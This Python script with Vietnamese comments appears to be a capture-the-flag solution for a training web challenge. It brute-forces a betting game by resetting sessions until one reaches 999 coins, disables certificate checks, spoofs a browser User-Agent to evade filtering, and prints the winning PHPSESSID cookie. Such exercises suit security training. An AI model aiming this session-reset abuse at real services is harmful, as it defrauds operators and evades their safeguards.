import requests
import urllib3

# Tắt cảnh báo SSL Insecure (bỏ qua lỗi chứng chỉ của server CTF)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://web-gcoin1.training.bksec.vn:8000/"

print("[*] Bắt đầu quá trình 'tự động làm giàu' (Brute-force All-in)...")
print("[*] Vui lòng đợi, có thể mất từ vài chục giây đến vài phút.")

attempts = 0

while True:
    attempts += 1
    session = requests.Session()
    # Giả lập trình duyệt thật để tránh bị filter chặn
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
    })
    
    # Bắt đầu mỗi session với 1 coin
    coins = 1
    
    while 0 < coins < 999:
        params = {
            "act": "bet",
            "bet_amount": coins,
            "choice": 0 # Liên tục All-in vào CHẴN
        }
        
        try:
            res = session.get(url, params=params, verify=False, timeout=5)
            data = res.json()
            
            if data.get("result") == "win":
                coins = data.get("coins") # Thắng thì update số tiền để All-in tiếp
            else:
                break # Thua thì gãy chuỗi, thoát vòng lặp nhỏ để tạo session mới
                
        except Exception as e:
            print(f"\n[!] Lỗi kết nối mạng: {e}")
            print("Đang dừng script...")
            exit()

    # Kiểm tra xem đã đạt target chưa
    if coins >= 999:
        print(f"\n🎉 BINGO! Sau {attempts} lần reset, bạn đã đạt {coins} COINS!")
        
        # Trích xuất Cookie PHPSESSID của phiên chiến thắng
        cookies = session.cookies.get_dict()
        phpsessid = cookies.get("PHPSESSID", "Không tìm thấy Cookie, hãy kiểm tra lại!")
        
        print("\n" + "="*60)
        print("🏆 THÀNH QUẢ CỦA BẠN 🏆")
        print(f"Cookie PHPSESSID: {phpsessid}")
        print("="*60)
        break
        
    # Báo cáo tiến độ cho đỡ sốt ruột (mỗi 50 lần thử in 1 dòng)
    if attempts % 50 == 0:
        print(f"[*] Đang thử... Đã reset session {attempts} lần...")